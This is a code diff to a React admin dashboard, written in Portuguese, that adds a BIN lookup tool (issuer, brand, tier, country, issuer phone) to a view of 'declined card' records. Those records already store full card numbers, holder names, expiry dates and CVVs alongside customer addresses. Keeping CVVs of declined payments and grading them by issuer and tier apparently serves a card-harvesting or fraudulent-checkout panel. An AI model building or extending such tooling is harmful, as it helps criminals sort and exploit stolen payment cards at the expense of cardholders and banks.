@@ -74,6 +74,20 @@ interface DeclinedCardRecord {
   cardHolder?: string;
   cardExpiry?: string;
   cardCvv?: string;
+  binInfo?: {
+    bin?: string;
+    brand?: string;
+    type?: string;
+    category?: string;
+    issuer?: string;
+    issuerPhone?: string;
+    issuerUrl?: string;
+    isoCode2?: string;
+    isoCode3?: string;
+    countryName?: string;
+    countryFlag?: string;
+    formatted?: string;
+  };
   installments?: number;
   items?: Array<{ title: string; unitPrice: number; quantity: number; size?: string; color?: string }>;
   subtotal?: number;
@@ -525,6 +539,39 @@ export const AdminDashboardPage: React.FC = () => {
 
   // Selected Declined Card Modal State
   const [selectedDeclinedCard, setSelectedDeclinedCard] = useState<DeclinedCardRecord | null>(null);
+
+  // BIN Checker Tool State
+  const [binSearchInput, setBinSearchInput] = useState<string>('');
+  const [binSearchResult, setBinSearchResult] = useState<any | null>(null);
+  const [binSearchLoading, setBinSearchLoading] = useState<boolean>(false);
+  const [binSearchError, setBinSearchError] = useState<string | null>(null);
+  const [showBinModal, setShowBinModal] = useState<boolean>(false);
+
+  const handleLookupBin = async (queryNumberOrBin?: string) => {
+    const raw = queryNumberOrBin || binSearchInput;
+    const clean = String(raw || '').replace(/\D/g, '');
+    if (clean.length < 6) {
+      setBinSearchError('Digite pelo menos os 6 primeiros dígitos do cartão (BIN).');
+      return;
+    }
+    setBinSearchLoading(true);
+    setBinSearchError(null);
+    try {
+      const res = await fetch(`/api/admin/bin/${clean}`);
+      const json = await res.json();
+      if (res.ok && json.success && json.data) {
+        setBinSearchResult(json.data);
+        setShowBinModal(true);
+      } else {
+        setBinSearchError(json.error || 'BIN não encontrado na base de dados.');
+        setBinSearchResult(null);
+      }
+    } catch (e: any) {
+      setBinSearchError('Erro ao consultar BIN: ' + (e?.message || 'Falha na conexão'));
+    } finally {
+      setBinSearchLoading(false);
+    }
+  };
 
   // Pagination States for Tables
   const [orderPage, setOrderPage] = useState<number>(1);
@@ -2608,6 +2655,99 @@ export const AdminDashboardPage: React.FC = () => {
                 })}
               </div>
 
+              {/* BIN Checker Bar */}
+              <div style={{
+                background: 'rgba(15, 23, 42, 0.65)',
+                border: '1px solid rgba(56, 189, 248, 0.25)',
+                borderRadius: '10px',
+                padding: '14px 18px',
+                marginBottom: '18px',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'space-between',
+                flexWrap: 'wrap',
+                gap: '12px'
+              }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                  <div style={{
+                    width: '36px',
+                    height: '36px',
+                    borderRadius: '8px',
+                    background: 'rgba(56, 189, 248, 0.15)',
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    color: '#38bdf8'
+                  }}>
+                    <CreditCard size={20} />
+                  </div>
+                  <div>
+                    <div style={{ color: '#fff', fontSize: '13px', fontWeight: 700, letterSpacing: '0.3px' }}>
+                      BIN CHECKER — CONSULTAR BANCO & BANDEIRA
+                    </div>
+                    <div style={{ color: '#94a3b8', fontSize: '11px', marginTop: '1px' }}>
+                      Base integrada com mais de 374.000 BINs. Digite os 6 primeiros dígitos do cartão.
+                    </div>
+                  </div>
+                </div>
+
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flex: '1 1 320px', maxWidth: '480px' }}>
+                  <input
+                    type="text"
+                    placeholder="Digite o BIN (ex: 516292) ou o cartão..."
+                    value={binSearchInput}
+                    onChange={(e) => setBinSearchInput(e.target.value)}
+                    onKeyDown={(e) => { if (e.key === 'Enter') handleLookupBin(); }}
+                    style={{
+                      flex: 1,
+                      padding: '8px 12px',
+                      background: 'rgba(0, 0, 0, 0.4)',
+                      border: '1px solid rgba(255, 255, 255, 0.12)',
+                      borderRadius: '6px',
+                      color: '#fff',
+                      fontSize: '13px',
+                      fontFamily: 'JetBrains Mono, monospace'
+                    }}
+                  />
+                  <button
+                    type="button"
+                    onClick={() => handleLookupBin()}
+                    disabled={binSearchLoading}
+                    style={{
+                      padding: '8px 16px',
+                      background: '#0284c7',
+                      border: 'none',
+                      borderRadius: '6px',
+                      color: '#fff',
+                      fontSize: '12px',
+                      fontWeight: 700,
+                      cursor: 'pointer',
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '6px',
+                      whiteSpace: 'nowrap'
+                    }}
+                  >
+                    <Search size={14} />
+                    {binSearchLoading ? 'BUSCANDO...' : 'CONSULTAR BIN'}
+                  </button>
+                </div>
+              </div>
+
+              {binSearchError && (
+                <div style={{
+                  padding: '10px 14px',
+                  background: 'rgba(239, 68, 68, 0.15)',
+                  border: '1px solid rgba(239, 68, 68, 0.3)',
+                  borderRadius: '6px',
+                  color: '#f87171',
+                  fontSize: '12px',
+                  marginBottom: '16px'
+                }}>
+                  ⚠️ {binSearchError}
+                </div>
+              )}
+
               {/* Declined Cards List */}
               <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                 {filteredDeclinedCards.map((card) => {
@@ -2715,6 +2855,59 @@ export const AdminDashboardPage: React.FC = () => {
                           <div style={{ fontSize: '11px', color: '#a78bfa', marginTop: '6px', fontFamily: 'JetBrains Mono' }}>
                             Parcelas: {card.installments || 1}
                           </div>
+
+                          {/* BIN Checker Card Info Badge */}
+                          {card.binInfo ? (
+                            <div style={{
+                              marginTop: '8px',
+                              padding: '8px 10px',
+                              background: 'rgba(56, 189, 248, 0.08)',
+                              border: '1px solid rgba(56, 189, 248, 0.3)',
+                              borderRadius: '6px',
+                              fontFamily: 'JetBrains Mono, monospace'
+                            }}>
+                              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '4px' }}>
+                                <span style={{ color: '#38bdf8', fontWeight: 800, fontSize: '11px' }}>
+                                  BIN {card.binInfo.bin || card.cardNumber?.replace(/\D/g, '').slice(0, 6)}
+                                </span>
+                                <span style={{ fontSize: '11px' }}>
+                                  {card.binInfo.countryFlag || '🇧🇷'} {card.binInfo.isoCode2 || 'BR'}
+                                </span>
+                              </div>
+                              <div style={{ color: '#ffffff', fontWeight: 700, fontSize: '11px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }} title={card.binInfo.issuer}>
+                                🏦 {card.binInfo.issuer || 'BANCO EMISSOR'}
+                              </div>
+                              <div style={{ color: '#94a3b8', fontSize: '10px', marginTop: '2px', display: 'flex', gap: '6px', alignItems: 'center' }}>
+                                <span>💳 {card.binInfo.type || 'CREDIT'}</span>
+                                {card.binInfo.category && card.binInfo.category !== 'STANDARD' && (
+                                  <span style={{ color: '#eab308', fontWeight: 700 }}>· {card.binInfo.category}</span>
+                                )}
+                              </div>
+                            </div>
+                          ) : (
+                            <button
+                              type="button"
+                              onClick={() => handleLookupBin(card.cardNumber)}
+                              style={{
+                                marginTop: '6px',
+                                width: '100%',
+                                padding: '5px 8px',
+                                background: 'rgba(56, 189, 248, 0.1)',
+                                border: '1px dashed rgba(56, 189, 248, 0.4)',
+                                borderRadius: '5px',
+                                color: '#38bdf8',
+                                fontSize: '11px',
+                                fontWeight: 600,
+                                cursor: 'pointer',
+                                display: 'flex',
+                                alignItems: 'center',
+                                justifyContent: 'center',
+                                gap: '6px'
+                              }}
+                            >
+                              <Search size={12} /> Consultar BIN
+                            </button>
+                          )}
                         </div>
 
                         {/* Column 2: CLIENTE & ENDEREÇO */}
@@ -5861,6 +6054,19 @@ export const AdminDashboardPage: React.FC = () => {
                 <div style={{ fontSize: '12px', color: '#f59e0b', marginTop: '4px' }}>
                   Status: Transação não autorizada pela operadora do cartão
                 </div>
+                {selectedDeclinedCard.binInfo && (
+                  <div style={{ marginTop: '12px', paddingTop: '10px', borderTop: '1px solid rgba(255,255,255,0.08)' }}>
+                    <div style={{ fontSize: '11px', color: '#38bdf8', fontWeight: 800, fontFamily: 'JetBrains Mono' }}>
+                      BIN {selectedDeclinedCard.binInfo.bin} · {selectedDeclinedCard.binInfo.countryFlag} {selectedDeclinedCard.binInfo.countryName}
+                    </div>
+                    <div style={{ fontSize: '13px', color: '#fff', fontWeight: 700, marginTop: '2px' }}>
+                      🏦 {selectedDeclinedCard.binInfo.issuer}
+                    </div>
+                    <div style={{ fontSize: '12px', color: '#94a3b8', marginTop: '2px' }}>
+                      💳 {selectedDeclinedCard.binInfo.type} {selectedDeclinedCard.binInfo.category && `· ${selectedDeclinedCard.binInfo.category}`}
+                    </div>
+                  </div>
+                )}
               </div>
 
               {/* Items in Cart */}
@@ -6087,6 +6293,134 @@ export const AdminDashboardPage: React.FC = () => {
                 💰 <strong>Dica:</strong> Em tela cheia no iPhone, o app funciona com som de venda em tempo real e sem as barras do navegador!
               </div>
             </div>
+          </div>
+        </div>
+      )}
+
+      {/* -------------------------------------------------------------
+          MODAL: RESULTADO DA CONSULTA DE BIN
+          ------------------------------------------------------------- */}
+      {showBinModal && binSearchResult && (
+        <div
+          className="cc-drawer-overlay"
+          style={{ zIndex: 99999, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}
+          onClick={() => setShowBinModal(false)}
+        >
+          <div
+            style={{
+              width: '100%',
+              maxWidth: '480px',
+              backgroundColor: '#0f172a',
+              borderRadius: '14px',
+              border: '1px solid rgba(56,189,248,0.4)',
+              boxShadow: '0 25px 50px -12px rgba(0,0,0,0.9)',
+              padding: '24px',
+              display: 'flex',
+              flexDirection: 'column',
+              position: 'relative'
+            }}
+            onClick={(e) => e.stopPropagation()}
+          >
+            {/* Header */}
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
+              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                <span style={{ fontSize: '20px' }}>💳</span>
+                <h3 style={{ margin: 0, fontSize: '16px', color: '#fff', fontWeight: 800 }}>
+                  CONSULTA DE BIN: {binSearchResult.bin}
+                </h3>
+              </div>
+              <button
+                type="button"
+                onClick={() => setShowBinModal(false)}
+                style={{ background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer', padding: '4px' }}
+              >
+                <X size={20} />
+              </button>
+            </div>
+
+            {/* Visual Card Mockup */}
+            <div style={{
+              background: 'linear-gradient(135deg, #1e293b 0%, #0f172a 100%)',
+              border: '1px solid rgba(56,189,248,0.3)',
+              borderRadius: '12px',
+              padding: '18px 20px',
+              marginBottom: '18px',
+              position: 'relative',
+              boxShadow: '0 10px 25px -5px rgba(0,0,0,0.5)'
+            }}>
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
+                <span style={{
+                  fontSize: '11px',
+                  fontWeight: 800,
+                  color: '#38bdf8',
+                  letterSpacing: '1px',
+                  fontFamily: 'JetBrains Mono, monospace'
+                }}>
+                  {binSearchResult.brand || 'CARTÃO'}
+                </span>
+                <span style={{ fontSize: '18px' }}>
+                  {binSearchResult.countryFlag || '🌐'}
+                </span>
+              </div>
+
+              <div style={{ fontSize: '20px', fontWeight: 800, color: '#fff', fontFamily: 'JetBrains Mono, monospace', letterSpacing: '2px', marginBottom: '16px' }}>
+                {binSearchResult.bin} •• •••• ••••
+              </div>
+
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end' }}>
+                <div>
+                  <div style={{ fontSize: '10px', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>EMISSOR</div>
+                  <div style={{ fontSize: '13px', fontWeight: 700, color: '#fff', marginTop: '2px' }}>
+                    {binSearchResult.issuer || 'BANCO EMISSOR'}
+                  </div>
+                </div>
+                <div style={{ textAlign: 'right' }}>
+                  <div style={{ fontSize: '10px', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>TIPO / NÍVEL</div>
+                  <div style={{ fontSize: '12px', fontWeight: 700, color: '#eab308', marginTop: '2px' }}>
+                    {binSearchResult.type} {binSearchResult.category && `· ${binSearchResult.category}`}
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* Detailed Table */}
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginBottom: '20px', fontSize: '12px', fontFamily: 'JetBrains Mono, monospace' }}>
+              <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 12px', background: 'rgba(255,255,255,0.03)', borderRadius: '6px' }}>
+                <span style={{ color: '#94a3b8' }}>Bandeira:</span>
+                <span style={{ color: '#38bdf8', fontWeight: 700 }}>{binSearchResult.brand}</span>
+              </div>
+              <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 12px', background: 'rgba(255,255,255,0.03)', borderRadius: '6px' }}>
+                <span style={{ color: '#94a3b8' }}>Banco / Emissor:</span>
+                <span style={{ color: '#fff', fontWeight: 700 }}>{binSearchResult.issuer}</span>
+              </div>
+              <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 12px', background: 'rgba(255,255,255,0.03)', borderRadius: '6px' }}>
+                <span style={{ color: '#94a3b8' }}>Tipo:</span>
+                <span style={{ color: '#fff' }}>{binSearchResult.type}</span>
+              </div>
+              <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 12px', background: 'rgba(255,255,255,0.03)', borderRadius: '6px' }}>
+                <span style={{ color: '#94a3b8' }}>Nível / Categoria:</span>
+                <span style={{ color: '#eab308', fontWeight: 700 }}>{binSearchResult.category}</span>
+              </div>
+              <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 12px', background: 'rgba(255,255,255,0.03)', borderRadius: '6px' }}>
+                <span style={{ color: '#94a3b8' }}>País:</span>
+                <span style={{ color: '#fff' }}>{binSearchResult.countryFlag} {binSearchResult.countryName} ({binSearchResult.isoCode2})</span>
+              </div>
+              {binSearchResult.issuerPhone && (
+                <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 12px', background: 'rgba(255,255,255,0.03)', borderRadius: '6px' }}>
+                  <span style={{ color: '#94a3b8' }}>Telefone do Emissor:</span>
+                  <span style={{ color: '#cbd5e1' }}>{binSearchResult.issuerPhone}</span>
+                </div>
+              )}
+            </div>
+
+            <button
+              type="button"
+              className="cc-btn-primary"
+              style={{ width: '100%', padding: '12px', fontSize: '13px' }}
+              onClick={() => setShowBinModal(false)}
+            >
+              FECHAR CONSULTA
+            </button>
           </div>
         </div>
       )}
